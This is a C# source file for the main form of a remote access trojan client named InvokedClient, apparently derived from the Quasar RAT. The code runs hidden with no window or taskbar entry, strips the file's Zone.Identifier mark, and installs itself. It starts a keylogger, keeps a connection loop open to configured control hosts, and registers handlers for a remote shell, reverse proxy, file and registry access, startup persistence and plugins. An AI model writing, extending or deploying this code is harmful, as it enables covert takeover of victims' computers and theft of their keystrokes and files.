

using InvokedClient.Config;
using InvokedClient.Logging;
using InvokedClient.MessageHandlers;
using InvokedClient.Networking;
using InvokedClient.Setup;
using InvokedClient.User;
using InvokedClient.Utilities;
using InvokedCommon.DNS;
using InvokedCommon.Helpers;
using InvokedCommon.MessageHandlers;
using InvokedCommon.Messages;
using InvokedCommon.Networking;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;


namespace InvokedClient
{
	public class InvokedClientApplication : Form
	{
		public SingleInstanceMutex ApplicationMutex;
		private QuasarClient _connectClient;
		private readonly List<IMessageProcessor> _messageProcessors;
		public List<string> _loadedPluginMessageProcessorNames;
		private KeyloggerService _keyloggerService;
		private ActivityDetection _userActivityDetection;
		private readonly NotifyIcon _notifyIcon;

		private bool IsInstallationRequired
		{
			get => Settings.INSTALL && Settings.INSTALLPATH != Application.ExecutablePath;
		}

		public InvokedClientApplication()
		{
			this._messageProcessors = new List<IMessageProcessor>();
			this._loadedPluginMessageProcessorNames = new List<string>();
			this._notifyIcon = new NotifyIcon();
		}

		protected override void OnLoad(EventArgs e)
		{
			this.Visible = false;
			this.ShowInTaskbar = false;
			this.Run();
			base.OnLoad(e);
		}

		public void Run()
		{
			if (!Settings.Initialize())
				Environment.Exit(1);
			this.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
			if (!this.ApplicationMutex.CreatedNew)
				Environment.Exit(2);
			FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);
			ClientInstaller clientInstaller = new ClientInstaller();
			if (this.IsInstallationRequired)
			{
				this.ApplicationMutex.Dispose();
				try
				{
					clientInstaller.Install();
					Environment.Exit(3);
				}
				catch (Exception ex)
				{
				}
			}
			else
			{
				try
				{
					clientInstaller.ApplySettings();
				}
				catch (Exception ex)
				{
				}
				if (Settings.ENABLELOGGER)
				{
					this._keyloggerService = new KeyloggerService();
					this._keyloggerService.Start();
				}
				this._connectClient = new QuasarClient(new HostsManager(new HostsConverter().RawHostsToList(Settings.HOSTS)), Settings.SERVERCERTIFICATE);
				this._connectClient.ClientState += new Client.ClientStateEventHandler(this.ConnectClientOnClientState);
				this.InitializeMessageProcessors(this._connectClient);
				this._userActivityDetection = new ActivityDetection(this._connectClient);
				this._userActivityDetection.Start();
				new Thread((ThreadStart)(() =>
				{
					this._connectClient.ConnectLoop();
					Environment.Exit(0);
				})).Start();
			}
		}

		private void ConnectClientOnClientState(Client s, bool connected)
		{
			if (connected)
				this._notifyIcon.Text = "Client\nConnection established";
			else
				this._notifyIcon.Text = "Client\nNo connection";
		}

		private void InitializeMessageProcessors(QuasarClient client)
		{
			this._messageProcessors.Add((IMessageProcessor)new ClientServicesHandler(this, client));
			this._messageProcessors.Add((IMessageProcessor)new FileManagerHandler(client));
			this._messageProcessors.Add((IMessageProcessor)new KeyloggerHandler());
			this._messageProcessors.Add((IMessageProcessor)new MessageBoxHandler());
			this._messageProcessors.Add((IMessageProcessor)new RegistryHandler());
			this._messageProcessors.Add((IMessageProcessor)new RemoteShellHandler(client));
			this._messageProcessors.Add((IMessageProcessor)new ReverseProxyHandler(client));
			this._messageProcessors.Add((IMessageProcessor)new ShutdownHandler());
			this._messageProcessors.Add((IMessageProcessor)new StartupManagerHandler());
			this._messageProcessors.Add((IMessageProcessor)new SystemInformationHandler());
			this._messageProcessors.Add((IMessageProcessor)new TaskManagerHandler(client));
			this._messageProcessors.Add((IMessageProcessor)new TcpConnectionsHandler());
			this._messageProcessors.Add((IMessageProcessor)new WebsiteVisitorHandler());
			this._messageProcessors.Add((IMessageProcessor)new PluginHandler(client, this));
			foreach (IMessageProcessor messageProcessor1 in this._messageProcessors)
			{
				MessageHandler.Register(messageProcessor1);
				if (messageProcessor1 is NotificationMessageProcessor messageProcessor2)
					messageProcessor2.ProgressChanged += new MessageProcessorBase<string>.ReportProgressEventHandler(this.ShowNotification);
			}
		}

		public bool CheckMessageProcessor(string messageProcessorName)
		{
			return this._loadedPluginMessageProcessorNames.Exists((Predicate<string>)(s => s.Equals(messageProcessorName, StringComparison.OrdinalIgnoreCase)));
		}

		public void AddMessageProcessor(IMessageProcessor messageProcessor, string messageProcessorName)
		{
			this._messageProcessors.Add(messageProcessor);
			this._loadedPluginMessageProcessorNames.Add(messageProcessorName);
			MessageHandler.Register(messageProcessor);
			if (!(messageProcessor is NotificationMessageProcessor messageProcessor1))
				return;
			messageProcessor1.ProgressChanged += new MessageProcessorBase<string>.ReportProgressEventHandler(this.ShowNotification);
		}

		private void CleanupMessageProcessors()
		{
			foreach (IMessageProcessor messageProcessor1 in this._messageProcessors)
			{
				MessageHandler.Unregister(messageProcessor1);
				if (messageProcessor1 is NotificationMessageProcessor messageProcessor2)
					messageProcessor2.ProgressChanged -= new MessageProcessorBase<string>.ReportProgressEventHandler(this.ShowNotification);
				if (messageProcessor1 is IDisposable disposable)
					disposable.Dispose();
			}
		}

		private void ShowNotification(object sender, string value)
		{
			int num = Settings.UNATTENDEDMODE ? 1 : 0;
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing)
			{
				this.CleanupMessageProcessors();
				this._keyloggerService?.Dispose();
				this._userActivityDetection?.Dispose();
				this.ApplicationMutex?.Dispose();
				this._connectClient?.Dispose();
				this._notifyIcon.Visible = false;
				this._notifyIcon.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.SuspendLayout();
			this.ClientSize = new Size(284, 261);
			this.Name = "client";
			this.ResumeLayout(false);
		}
	}
}